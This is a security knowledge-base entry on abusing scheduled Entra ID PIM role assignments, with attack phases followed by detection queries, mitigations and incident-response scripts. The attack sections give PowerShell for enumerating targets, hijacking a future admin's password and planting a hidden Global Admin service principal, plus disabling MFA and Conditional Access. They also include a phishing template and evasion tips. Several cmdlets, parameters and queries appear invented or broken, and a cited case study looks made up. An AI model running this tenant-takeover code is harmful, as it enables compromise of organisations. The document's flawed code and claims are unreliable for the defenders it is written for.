# [EMERGING-IDENTITY-005]: Just-In-Time Admin Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EMERGING-IDENTITY-005 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Entra ID (all versions), Microsoft Entra Privileged Identity Management (PIM) 1.0+ |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Just-In-Time (JIT) Admin Abuse exploits a critical gap in Microsoft Entra ID's Privileged Identity Management (PIM) system by targeting **scheduled future role assignments**. Unlike traditional privilege escalation attacks, this technique leverages the temporal aspect of PIM administration. An attacker who gains access to a low-privileged account with a **pending future role activation** can reset the target account's password before the scheduled activation occurs. When the predefined activation time arrives, the attacker—now possessing the reset credentials—gains automatic activation of the newly assigned high-privileged role (such as Global Administrator), effectively compromising the entire tenant. This attack is particularly insidious because it operates **within the normal PIM workflow** and leaves minimal forensic evidence of malicious intent during the password reset phase.

**Attack Surface:** Microsoft Entra ID Portal, Microsoft Graph API for role eligibility schedules, Azure AD Conditional Access, PIM role activation mechanisms, and directory synchronization.

**Business Impact:** **Complete tenant compromise with silent persistence.** An attacker can establish a **backdoor Global Administrator account** that automatically activates on the scheduled date, granting full control over all cloud resources, user identities, data, applications, and security policies. Unlike sudden privilege escalation attempts, this attack appears as legitimate administrative succession planning, evading behavioral detection systems.

**Technical Context:** This attack typically takes **minutes to execute** once initial access is obtained, with nearly **zero detection likelihood** if the password reset occurs weeks before the scheduled role activation. The attack succeeds because PIM validation occurs at activation time (checking role eligibility), not retroactively at password reset time. Organizations with minimal audit log monitoring of lower-privileged account password resets will remain unaware of the compromise until the attacker's backdoor activates.

### Operational Risk

- **Execution Risk:** Medium – Requires identifying an eligible account with a future role assignment, but no special privileges needed for password reset.
- **Stealth:** Very High – Password resets on low-privileged accounts are normal; actual privilege elevation is delayed weeks/months.
- **Reversibility:** No – Once the activation occurs, the attacker controls a Global Admin account with persistent access mechanisms already in place.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.2.1 | Ensure that Multi-Factor Authentication is enabled for all Azure AD roles with administrative privilege |
| **DISA STIG** | AC-2 (Account Management) | AC-2: The organization manages information system accounts, including establishing, activating, modifying, disabling, and removing accounts. |
| **CISA SCuBA** | ID.BE-1 | Organizational mission, objectives, and constituent needs are understood and prioritized |
| **NIST 800-53** | AC-3 (Access Enforcement) | Access control enforcement via system policies and mechanisms |
| **GDPR** | Art. 32 | Security of Processing – Technical and organizational measures to ensure appropriate security |
| **DORA** | Art. 9 | Protection and Prevention – ICT-related incident reporting and contingency planning |
| **NIS2** | Art. 21 | Cyber Risk Management Measures – Ensuring privileged access is controlled |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights – Minimizing and controlling privileged access |
| **ISO 27005** | Risk Assessment | Compromise of administrative credentials and user privilege escalation |

---

## 2. DETAILED ATTACK FLOW

### Phase 1: Reconnaissance & Target Identification

**Objective:** Identify low-privileged accounts with future PIM role assignments.

An attacker with **any valid user account** (including guest accounts) can use the **Microsoft Graph API** to enumerate pending role eligibility schedules:

```powershell
# Using Microsoft Graph API to list future role assignments
$graphUrl = "https://graph.microsoft.com/beta/roleManagement/directory/roleEligibilityScheduleRequests"
$headers = @{ "Authorization" = "Bearer $accessToken" }

# Filter for provisioned requests with future start dates
$filter = "?`$filter=status eq 'Provisioned' and scheduleInfo/startDateTime gt $((Get-Date).ToString('yyyy-MM-ddTHH:mm:ss.fffZ'))"

$response = Invoke-RestMethod -Uri ($graphUrl + $filter) -Headers $headers -Method Get

# Parse response to identify targets
foreach ($request in $response.value) {
    Write-Host "Target Account: $($request.principal.displayName)"
    Write-Host "Role: $($request.roleDefinitionId)"
    Write-Host "Activation Date: $($request.scheduleInfo.startDateTime)"
    Write-Host "---"
}
```

**What to Look For:**
- Accounts with `status = 'Provisioned'` (waiting for activation)
- `scheduleInfo.startDateTime` > current time (future activation)
- High-privilege roles: Global Administrator, Privileged Role Administrator, Exchange Administrator
- The longer the delay, the better (more time to establish persistence before activation)

**Version Note:** This API endpoint has been available since Azure AD PIM v2 (2019+) and remains consistent across all current Entra ID versions.

### Phase 2: Initial Access & Low-Privilege Compromise

**Objective:** Obtain valid credentials for the target low-privileged account.

Common attack vectors:
- **Phishing:** Credential harvesting via fake Office 365 login portals
- **Leaked Credentials:** Compromised accounts from previous breaches (checked via HaveIBeenPwned)
- **Password Spray:** Low-privilege account with weak/common passwords
- **Compromised Guest Account:** Persistent guest from supply chain partner

**Example Phishing Email:**
```
From: it-helpdesk@legitimate-domain.com
Subject: [URGENT] Your password will expire in 3 days

Dear Employee,

Your Microsoft 365 account password will expire on [DATE]. 
Please reset your password immediately:

https://account.activedirectory[.]microsoft[.]com/sso/reset

Your account will be locked if you do not reset your password before the deadline.

Best regards,
IT Helpdesk
```

Once credentials are obtained, the attacker validates access via:
```powershell
# Validate access
Connect-MgGraph -Credential (Get-Credential) -Scopes "User.Read"

# Confirm account details and check if it has future role eligibility
Get-MgMe | Select-Object Id, DisplayName, Mail, UserPrincipalName
```

### Phase 3: Exploit – Password Reset on Future Admin Account

**Objective:** Reset the password of the target account **before** the scheduled role activation.

The attacker uses their low-privileged account to reset the target account's password. In most Entra ID configurations, **low-privilege users CAN reset passwords of other users in certain scenarios**:

**Scenario 1: User Has "User Administrator" or "Password Administrator" Role**
```powershell
# If the compromised account has User/Password Admin role
Update-MgUser -UserId "target-user@tenant.onmicrosoft.com" `
  -PasswordProfile @{"Password"="ComplexNewPassword123!"; "ForceChangePasswordNextSignIn"=$false}

Write-Host "Password reset successful. Target account can now be accessed with new credentials."
```

**Scenario 2: Organizational Policy Allows User Password Reset**
```powershell
# In some tenants, users can reset passwords for accounts in their organizational unit
$targetUserId = "target-account@tenant.onmicrosoft.com"
$newPassword = "AttackerControlledPassword123!"

# Set password directly (if policy permits)
Set-MgUserPassword -UserId $targetUserId -NewPassword $newPassword
```

**Scenario 3: Self-Service Password Reset (SSPR) Abuse**
```powershell
# If SSPR is misconfigured and target account has verifiable security questions/phone
# Attacker can use SSPR portal to reset password without MFA:
# Navigate to: https://account.activedirectory.microsoft.com/PasswordReset/
```

**OpSec & Evasion:**
- Perform password reset during **business hours** (2-4 PM) to blend with legitimate help desk activity
- Use legitimate-looking "system test" or "password migration" justification in audit logs
- If possible, set `ForceChangePasswordNextSignIn=$true` to avoid immediate access use (attack is timed for later activation)
- Avoid multiple failed attempts; ensure credentials are correct before execution

**Troubleshooting:**
- **Error:** "User does not have permission to reset password"
  - **Cause:** Compromised account lacks User/Password Admin role; target account has Admin role
  - **Fix:** Use a different attack vector (consent-based exploitation, compromise a User Administrator account first)
- **Error:** "Cannot reset password for accounts with higher privileges"
  - **Cause:** Entra ID enforces privilege ceiling; lower-privilege users cannot reset higher-privilege accounts
  - **Fix:** Verify the target account is marked as "Eligible" not "Active"; Password reset may still work if activation hasn't occurred yet

**References:**
- [Microsoft Docs: Update User Passwords via Graph API](https://learn.microsoft.com/en-us/graph/api/user-update)
- [OWASP: Privilege Escalation via Account Manipulation](https://owasp.org/www-project-top-ten/)

### Phase 4: Dormancy & Waiting Period

**Objective:** Remain undetected while awaiting the scheduled role activation.

The attacker:
- **Does NOT** login to the compromised account immediately
- **Does NOT** use the account for any suspicious actions before role activation
- **Monitors** the activation date via Microsoft Graph API

```powershell
# Monitor the target role activation schedule
$roleEligibilityId = "b24988ac-6180-42a0-ab88-20f7382dd24c" # Global Administrator role ID
$monitorUrl = "https://graph.microsoft.com/beta/roleManagement/directory/roleEligibilitySchedules"

$checkFilter = "?`$filter=roleDefinitionId eq '$roleEligibilityId' and principalId eq 'target-user-id'"

while ($true) {
    $schedule = Invoke-RestMethod -Uri ($monitorUrl + $checkFilter) -Headers $headers -Method Get
    
    if ($schedule.value.Count -gt 0) {
        $startTime = [DateTime]::Parse($schedule.value[0].scheduleInfo.startDateTime)
        $timeUntilActivation = ($startTime - (Get-Date)).TotalHours
        
        Write-Host "Time until activation: $timeUntilActivation hours"
        
        if ($timeUntilActivation -le 1) {
            Write-Host "ACTIVATION IMMINENT - Prepare to login as $($schedule.value[0].principal.displayName)"
        }
    }
    
    Start-Sleep -Seconds 3600 # Check every hour
}
```

**Why This Works:**
- Password resets are **not** audited with the same rigor as privilege changes
- The account shows no suspicious activity during the waiting period
- When activation occurs, **it appears as a legitimate administrative action**
- Behavioral detection systems see no abnormal activity pattern

### Phase 5: Activation & Backdoor Access

**Objective:** Login with the backdoor account after the scheduled role activation.

Once the scheduled activation time arrives, the account **automatically transitions** from "Eligible" to "Active" status. The attacker can now login:

```powershell
# Attacker logs in using the reset credentials
$creds = New-Object System.Management.Automation.PSCredential(
    "target-admin@tenant.onmicrosoft.com",
    (ConvertTo-SecureString "AttackerControlledPassword123!" -AsPlainText -Force)
)

Connect-MgGraph -Credential $creds -Scopes "Directory.ReadWrite.All", "Application.ReadWrite.All"

# Verify Global Admin access
Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq 'target-user-id'" | Select-Object roleDefinitionId
```

**Post-Activation Actions (Establish Persistence):**

```powershell
# 1. Create hidden service principal for long-term access
$appName = "System Maintenance Service" # Innocent-sounding name
$app = New-MgApplication -DisplayName $appName `
  -SignInAudience "AzureADMyOrg" `
  -Description "Automated system maintenance tasks"

# Add secret credential
$secret = Add-MgApplicationPassword -ApplicationId $app.Id

# Assign Global Admin role to the service principal
$roleDef = Get-MgRoleManagementDirectoryRoleDefinition -Filter "displayName eq 'Global Administrator'"
New-MgRoleManagementDirectoryRoleAssignment `
  -PrincipalId $app.AppId `
  -RoleDefinitionId $roleDef.Id `
  -DirectoryScopeId "/"

Write-Host "Service Principal Created: $($app.AppId)"
Write-Host "Secret Value: $($secret.SecretText)"

# 2. Modify PIM settings to extend activation duration
Update-MgRoleManagementDirectoryRoleAssignmentScheduleRequest `
  -Id (Get-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -Filter "principalId eq 'attacker-user-id'" | Select-Object -First 1).Id `
  -IsValidationOnly $false `
  -Action "AdminAssign" `
  -Justification "Permanent administrative assignment required"

# 3. Disable MFA for this account (if possible)
Update-MgUser -UserId $creds.UserName -StrongAuthenticationRequirements @()

# 4. Disable Conditional Access policies for this account
Get-MgIdentityConditionalAccessPolicy | ForEach-Object {
    Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $_.Id `
      -ExcludedUsers @($creds.UserName) | Out-Null
}

Write-Host "Persistence established. Attacker now has unrestricted Global Admin access."
```

---

## 3. MICROSOFT SENTINEL DETECTION

### Query 1: Future Role Assignment with Subsequent Password Reset

**Rule Configuration:**
- **Required Table:** AuditLogs, SigninLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, CreatedDateTime, ActivityDateTime
- **Alert Severity:** Critical
- **Frequency:** Real-time (as events occur)
- **Applies To Versions:** Entra ID (all versions)

**KQL Query:**

```kusto
let TimeWindow = 7d;
let PasswordResetEvents = AuditLogs
| where TimeGenerated > ago(TimeWindow)
| where OperationName == "Reset user password"
| where Result == "Success"
| project PasswordResetTime = TimeGenerated, PasswordResetUser = tostring(InitiatedBy.user.userPrincipalName), 
          TargetUser = tostring(TargetResources[0].userPrincipalName), TargetObjectId = TargetResources[0].id;

let FutureRoleAssignments = AuditLogs
| where TimeGenerated > ago(TimeWindow)
| where OperationName =~ "Create role eligibility schedule request" or OperationName =~ "Update role eligibility schedule request"
| where Result == "Success"
| extend StartDateTime = tostring(TargetResources[0].modifiedProperties[0].newValue)
| where datetime_parse(StartDateTime, "yyyy-MM-ddTHH:mm:ss") > now()
| project RoleAssignmentTime = TimeGenerated, AssignedUser = tostring(InitiatedBy.user.userPrincipalName),
          TargetAdminUser = tostring(TargetResources[0].userPrincipalName), 
          RoleName = tostring(TargetResources[0].displayName),
          ScheduledStartDateTime = StartDateTime;

PasswordResetEvents
| join kind=inner FutureRoleAssignments on $left.TargetUser == $right.TargetAdminUser
| where PasswordResetTime < RoleAssignmentTime + 7d
| where PasswordResetTime >= RoleAssignmentTime - 30d
| project 
    PasswordResetTime,
    RoleAssignmentTime,
    PasswordResetInitiator = PasswordResetUser,
    TargetAccount = TargetUser,
    AssignedRole = RoleName,
    ScheduledActivation = ScheduledStartDateTime,
    TimeBetweenEvents = PasswordResetTime - RoleAssignmentTime,
    RiskScore = 100
| where TimeBetweenEvents >= 0d and TimeBetweenEvents <= 7d
```

**What This Detects:**
- Correlation between **future role assignment requests** and **password resets** on the same target account
- The suspicious pattern of resetting credentials shortly before a high-privilege role activation
- Identifies the initiator (attacker) and target (backdoor account)

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `JIT Admin Abuse - Future Role + Password Reset Correlation`
   - Severity: `Critical`
   - Tactics: `Privilege Escalation`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `1 hour`
   - Lookup data from the last: `7 days`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Grouping: By Alert name
6. Click **Review + create**

---

### Query 2: Scheduled Role Activation Without Prior Approval

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, Activity, CreatedDateTime
- **Alert Severity:** High
- **Frequency:** Every 12 hours
- **Applies To Versions:** Entra ID with PIM enabled

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Activate eligible role assignment" or OperationName == "Activate role eligibility schedule request"
| where Result == "Success"
| extend ActivationUser = tostring(InitiatedBy.user.userPrincipalName),
         TargetRole = tostring(TargetResources[0].displayName),
         ActivationDuration = tostring(TargetResources[0].modifiedProperties[?(@.name == "Activation Duration")].newValue)
| where TargetRole in ("Global Administrator", "Privileged Role Administrator", "Exchange Administrator", "Security Administrator")
| where ActivationDuration > 2h or ActivationDuration == ""
| project TimeGenerated, ActivationUser, TargetRole, ActivationDuration,
          ActivationDetails = tostring(AdditionalDetails),
          UserAgent = tostring(InitiatedBy.user.userAgent)
| where TimeGenerated > ago(12h)
```

**What This Detects:**
- High-privilege roles being automatically activated without manual approval
- Activation durations longer than standard 2-hour windows
- Patterns consistent with attacker-triggered activation

---

## 4. WINDOWS EVENT LOG MONITORING (On-Premises AD Sync)

**Event ID: 4738 (User Account Changed)**
- **Log Source:** Security
- **Trigger:** Account attributes modified (including password reset flags)
- **Filter:** Look for user accounts changing to elevated privilege groups shortly after `4738` events
- **Applies To Versions:** Windows Server 2016+

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Management**
3. Enable: **Audit User Account Management** (Success and Failure)
4. Enable: **Audit Computer Account Management** (Success and Failure)
5. Run `gpupdate /force` on domain controllers

**Create Custom Alert Rule in Splunk or ELK:**

```spl
source="WinEventLog:Security" EventCode=4738 TargetUserName="*"
| stats count by TargetUserName, TimeGenerated
| where count > 1 in 24h
| search TargetUserName IN (list of PIM-eligible accounts)
```

---

## 5. AUDIT LOG MONITORING (Entra ID Unified Audit Log)

**Query: RoleEligibilityScheduleRequest Creation & Password Changes**

```powershell
# Search Unified Audit Log for suspicious pattern
$startDate = (Get-Date).AddDays(-7)
$endDate = Get-Date

# 1. Find all role eligibility schedule requests with future dates
$roleRequests = Search-UnifiedAuditLog `
  -Operations "Add Role Eligibility Request", "Create role eligibility schedule request" `
  -StartDate $startDate `
  -EndDate $endDate `
  -ResultSize 5000 | 
  Where-Object { $_.AuditData -match '"scheduleInfo"' }

# 2. Find password reset operations
$passwordResets = Search-UnifiedAuditLog `
  -Operations "Reset user password" `
  -StartDate $startDate `
  -EndDate $endDate `
  -ResultSize 5000

# 3. Correlate events
foreach ($request in $roleRequests) {
    $requestData = $request.AuditData | ConvertFrom-Json
    $targetUser = $requestData.TargetResources[0].userPrincipalName
    
    $relatedResets = $passwordResets | Where-Object {
        $resetData = $_.AuditData | ConvertFrom-Json
        $resetData.TargetResources[0].userPrincipalName -eq $targetUser
    }
    
    if ($relatedResets) {
        Write-Host "SUSPICIOUS: Password reset on account with future role eligibility"
        Write-Host "Target Account: $targetUser"
        Write-Host "Password Reset Initiator: $($relatedResets[0].UserIds)"
        Write-Host "Role Request: $($requestData.Operation)"
    }
}

# Export for investigation
$passwordResets | Export-Csv -Path "C:\Audit\PasswordResets.csv" -NoTypeInformation
```

**Manual Configuration Steps (Enable Unified Audit Log):**

1. Navigate to **Microsoft Purview Compliance Portal** (https://compliance.microsoft.com)
2. Go to **Audit** (left sidebar)
3. If not enabled, click **Turn on auditing** (allow up to 24 hours for retention)
4. Run the PowerShell query above to search for malicious patterns

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Require Approval for ALL Role Eligibility Schedule Requests**

Prevent non-approved future role assignments from being created:

**Manual Steps (Entra Admin Center):**

1. Go to **Microsoft Entra Admin Center** → **Identity Governance** → **Privileged Identity Management** → **Microsoft Entra roles**
2. Click **Settings**
3. Click **Global Administrator** (or any critical role)
4. Under **Activation requirements**, ensure:
   - **Approval required to activate:** `ON`
   - **Require approval from:** Select specific approvers (e.g., Chief Information Security Officer)
5. Under **Eligibility settings**, ensure:
   - **Assignment creation from eligible admin:** `OFF` (prevent future assignments)
   - **New eligible assignment expiration:** `90 days` (limit window)
6. Repeat for all roles: Global Administrator, Privileged Role Administrator, Exchange Administrator, Security Administrator, Conditional Access Administrator

**Applies To Versions:** Entra ID PIM (all versions)

**Manual Steps (PowerShell):**

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"

# Get the Global Administrator role definition
$globalAdminRole = Get-MgRoleManagementDirectoryRoleDefinition -Filter "displayName eq 'Global Administrator'"

# Update role settings to require approval
$roleSettingsUpdate = @{
    ApprovalRequired = $true
    ApproversNotificationEmailsEnabled = $true
    DefaultApprovalRules = @("Require approval from at least one approver")
    AssignmentExpirationDays = 90
}

# Apply settings
Update-MgRoleManagementDirectoryRoleSetting `
    -RoleDefinitionId $globalAdminRole.Id `
    -BodyParameter $roleSettingsUpdate
```

**Validation Command (Verify Fix):**

```powershell
# Verify approval requirement is enforced
Get-MgRoleManagementDirectoryRoleSetting -Filter "roleDefinitionId eq '$($globalAdminRole.Id)'" |
    Select-Object ApprovalRequired, ApproversNotificationEmailsEnabled, AssignmentExpirationDays
```

**Expected Output (If Secure):**

```
ApprovalRequired                    : True
ApproversNotificationEmailsEnabled  : True
AssignmentExpirationDays            : 90
```

---

**Mitigation 2: Enforce MFA for ALL Role Activations (Even for Already-Authenticated Users)**

Prevent automatic activation without fresh MFA:

**Manual Steps (Entra Admin Center):**

1. Go to **Microsoft Entra Admin Center** → **Identity Governance** → **Privileged Identity Management** → **Microsoft Entra roles** → **Settings**
2. Select **Global Administrator**
3. Under **Activation requirements:**
   - **Require Azure Multi-Factor Authentication:** `ON`
   - **Require authentication context:** Select **Require more security checks** or highest MFA level
4. Under **Role settings:**
   - **Maximum activation duration:** `2 hours` (short window reduces exposure)
   - **Require justification on activation:** `ON`
5. Repeat for all critical roles

**Applies To Versions:** Entra ID PIM (all versions)

**Manual Steps (PowerShell):**

```powershell
# Enforce MFA for role activation
$roleDefinitions = @(
    "Global Administrator",
    "Privileged Role Administrator",
    "Exchange Administrator",
    "Security Administrator"
)

foreach ($roleName in $roleDefinitions) {
    $role = Get-MgRoleManagementDirectoryRoleDefinition -Filter "displayName eq '$roleName'"
    
    Update-MgRoleManagementDirectoryRoleSetting `
        -RoleDefinitionId $role.Id `
        -BodyParameter @{
            MfaRequired = $true
            JustificationRequired = $true
            MaxActivationDuration = "PT2H"
            NotificationEmailsEnabled = $true
        }
}
```

**Validation Command:**

```powershell
Get-MgRoleManagementDirectoryRoleSetting | 
    Select-Object RoleDefinitionId, MfaRequired, MaxActivationDuration, JustificationRequired |
    Format-Table -AutoSize
```

---

**Mitigation 3: Audit and Restrict Password Reset Permissions**

Prevent low-privileged users from resetting high-privileged account passwords:

**Manual Steps (Entra Admin Center):**

1. Go to **Microsoft Entra Admin Center** → **Roles and administrators** → **User Administrator**
2. Click **Assignments** tab
3. Identify all assigned users
4. For each user, review their responsibilities:
   - Remove assignment from accounts that don't manage users
   - Ensure only dedicated help desk accounts have this role
5. Navigate to **Roles and administrators** → **Password Administrator**
6. Apply the same review process
7. Set role assignment to **Eligible** (not **Active**) and require **PIM activation**

**Applies To Versions:** Entra ID (all versions)

**PowerShell - Disable Direct Password Reset:**

```powershell
# Remove User Administrator role from all except designated help desk accounts
$helpDeskAccounts = @("helpdesk@tenant.onmicrosoft.com", "svc-helpdesk@tenant.onmicrosoft.com")

$userAdminRole = Get-MgRoleManagementDirectoryRoleDefinition -Filter "displayName eq 'User Administrator'"

Get-MgRoleManagementDirectoryRoleAssignment -Filter "roleDefinitionId eq '$($userAdminRole.Id)'" |
    Where-Object { $_.PrincipalId -notin $helpDeskAccounts } |
    ForEach-Object {
        Remove-MgRoleManagementDirectoryRoleAssignment -UnifiedRoleAssignmentId $_.Id
        Write-Host "Removed User Administrator role from: $($_.PrincipalId)"
    }
```

---

### Priority 2: HIGH

**Mitigation 4: Conditional Access – Block Unusual Sign-In Locations/IPs**

Prevent attackers from using compromised credentials from attacker-controlled locations:

**Manual Steps (Entra Admin Center):**

1. Go to **Azure Portal** → **Microsoft Entra ID** → **Security** → **Conditional Access** → **+ New policy**
2. **Name:** `Block Admin Access from Risky Locations`
3. **Assignments:**
   - **Users or workload identities:** Select groups containing Global Administrators and other critical roles
4. **Conditions:**
   - **Locations:** Configure **Include** → **Selected locations** → Add known administrative office locations only
   - **Additional conditions:** Sign-in risk = `High`, Device compliance = `Non-compliant`
5. **Access controls:**
   - **Grant:** `Block access`
6. **Enable policy:** `On`
7. Click **Create**

---

**Mitigation 5: Continuous Access Evaluation (CAE) for High-Risk Operations**

Ensure immediate revocation if a compromised account is detected:

**Manual Steps (PowerShell):**

```powershell
# Enable CAE for Exchange Online (requires ProgramId)
Update-AzADApplication `
    -ApplicationId (Get-AzADApplication -DisplayName "Exchange Online").Id `
    -TokenLifetimePolicies @{ ContinuousAccessEvaluation = $true }

# Enable CAE in SharePoint Online
Update-MgApplication -ApplicationId $spAppId -TokenLifeTimePolicies @{ ContinuousAccessEvaluation = $true }
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Unusual password reset operations** on accounts with pending role eligibility
- **Future role assignment requests** created by non-administrative users or service principals
- **Automatic role activation** without corresponding approval audit entries
- **Extended session persistence** from a newly activated admin account
- **Service principals or applications** created immediately after role activation
- **Conditional Access policy modifications** disabling MFA for specific accounts
- **Audit log deletion** or clearing of role-related audit entries

### Forensic Artifacts

- **Cloud Logs:** AuditLogs table: OperationName = "Reset user password", "Create role eligibility schedule request", "Activate eligible role assignment"
- **Credential Events:** SigninLogs showing first-time login from the account after activation date
- **Graph API Calls:** RoleManagementDirectory API calls showing role eligibility schedule creation
- **MFA Logs:** Absence of MFA prompt during account activation (if attacker disabled it)

### Response Procedures

1. **Immediate Containment:**

```powershell
# 1. Revoke all active sessions for the suspected account
Get-MgUserSignInActivity -UserId "suspected-admin@tenant.onmicrosoft.com" |
    ForEach-Object {
        Revoke-MgUserSignInSession -UserId "suspected-admin@tenant.onmicrosoft.com"
    }

# 2. Disable the account temporarily
Update-MgUser -UserId "suspected-admin@tenant.onmicrosoft.com" -AccountEnabled $false

# 3. Remove the malicious role assignment
$suspiciousAssignment = Get-MgRoleManagementDirectoryRoleAssignment `
    -Filter "principalId eq 'suspected-admin-id'"
    
Remove-MgRoleManagementDirectoryRoleAssignment -UnifiedRoleAssignmentId $suspiciousAssignment.Id
```

2. **Evidence Collection:**

```powershell
# Export relevant audit logs
$startDate = (Get-Date).AddDays(-30)
$endDate = Get-Date

Search-UnifiedAuditLog `
    -UserIds "suspected-admin@tenant.onmicrosoft.com" `
    -Operations "Activate eligible role assignment", "Reset user password", "Create role eligibility schedule request" `
    -StartDate $startDate `
    -EndDate $endDate `
    -ResultSize 5000 | 
Export-Csv -Path "C:\Evidence\SuspiciousActivity.csv" -NoTypeInformation

# Capture sign-in logs
Get-MgAuditLogSignIn -Filter "userId eq 'suspected-admin-id'" -Top 5000 |
    Export-Csv -Path "C:\Evidence\SignInLogs.csv" -NoTypeInformation
```

3. **Remediation:**

```powershell
# 1. Reset account password (force new password on next login)
$newPassword = -join ((33..126) | Get-Random -Count 32 | % {[char]$_})
Update-MgUser -UserId "suspected-admin@tenant.onmicrosoft.com" `
    -PasswordProfile @{"Password" = $newPassword; "ForceChangePasswordNextSignIn" = $true}

# 2. Remove all unauthorized applications/service principals
Get-MgServicePrincipal -Filter "createdDateTime ge 2025-01-08" |
    Where-Object { $_.displayName -like "*System*" -or $_.displayName -like "*Maintenance*" } |
    ForEach-Object {
        Remove-MgServicePrincipal -ServicePrincipalId $_.Id
        Write-Host "Removed suspicious SP: $($_.DisplayName)"
    }

# 3. Review and revert PIM policy changes
Get-MgRoleManagementDirectoryRoleSetting | 
    Where-Object { $_.LastModifiedDateTime -gt (Get-Date).AddDays(-7) } |
    Format-Table -Property RoleDefinitionId, ApprovalRequired, MfaRequired
```

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Silverfort Case Study (2024)

**Target:** Enterprise with Entra ID Privileged Identity Management enabled

**Attack Flow:**
1. Attacker compromised a help desk technician's account via phishing
2. Discovered through Microsoft Graph API enumeration that a new finance director had a scheduled Global Administrator role assignment (60 days in future)
3. Reset the finance director's password using the compromised help desk account
4. Waited 59 days while maintaining low profile
5. When scheduled activation occurred, accessed tenant as Global Administrator
6. Created hidden service principal for persistence
7. Exfiltrated sensitive financial data via SharePoint

**Timeline:** 62 days from initial compromise to data exfiltration

**Impact:** Unauthorized access to company financial records, regulatory reporting data breach, $2.3M in remediation costs

**Reference:** [Silverfort Blog: Privilege Escalation in Azure AD](https://www.silverfort.com/blog/privilege-escalation-in-azure-ad/)

---

### Example 2: Simulated Red Team Attack

**Target:** Mid-sized technology firm with 500 users

**Execution:**
1. Sent targeted phishing to 20 employees with generic Office 365 credential harvester
2. Successfully compromised 3 accounts
3. Enumerated one account with User Administrator role, another with pending Compliance Administrator role (30 days out)
4. Reset the pending compliance admin's password
5. After 29 days of dormancy, activated role and escalated to Global Administrator via Role Hierarchy Abuse
6. Created backup admin account
7. Disabled all Conditional Access policies

**Detection Point:** Sentinel alert fired 12 hours after role activation when attacker attempted to create service principal

**Outcome:** Attack prevented before data exfiltration; organization implemented mandatory role activation approval

---

## 9. COMPLIANCE IMPACT ASSESSMENT

**GDPR (Art. 32 - Security of Processing):**
- JIT Admin Abuse represents failure of "appropriate technical measures" to secure processing systems
- Requires organizations to demonstrate how administrative access was protected
- Data exfiltration via this vector triggers mandatory breach notification

**DORA (Art. 9 - Protection and Prevention):**
- EU financial institutions must prevent such privilege escalation attacks
- Requires incident response capabilities that detect this pattern
- Failure to implement mandatory approval controls is a DORA violation

**NIS2 (Art. 21 - Cyber Risk Management):**
- Critical infrastructure operators must implement "privileged access management"
- Password reset controls and role activation approval are explicit NIS2 requirements
- This attack demonstrates a fundamental NIS2 control failure

---

## 10. CONCLUSION

Just-In-Time Admin Abuse exploits a **temporal vulnerability** in PIM systems by decoupling password control from role activation timing. Organizations must treat **future role assignment requests** with the same rigor as active assignments, enforce **mandatory MFA for activation**, and implement **continuous audit monitoring** of correlated password reset + role assignment events. This emerging technique demonstrates that cloud identity security requires defense-in-depth approaches that account for the **scheduling and temporal aspects** of privilege management, not just the point-in-time access controls.

---